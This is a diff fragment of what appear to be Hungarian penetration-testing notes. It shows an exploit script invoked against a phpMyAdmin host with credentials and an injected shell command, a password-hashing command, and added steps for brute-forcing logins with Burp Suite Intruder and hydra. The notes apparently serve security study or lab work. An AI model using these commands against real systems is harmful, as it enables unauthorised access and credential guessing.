@@ -155,3 +155,13 @@ python3 50457.py  40.0.5.16 80 /phpmyadmin pma pmapass "cd /tmp; rm -rf /tmp/she
  ```
 openssl passwd -5 alma
 ```
+## Burpsuite
+Firefox addon FoxyProxy
+Proxy tab --> Intercept ON
+Request küldése majd jobb klikk
+Send to Repeater (jelszavak próbálgatása, manualisan)
+Send to Intruder 
+ Hozzáadjuk az add al, majd payload tab, megadjuk a jelszavakat és start attack, ezután nézzük a hosszakat
+
+ ## Basic Authos
+ hydra
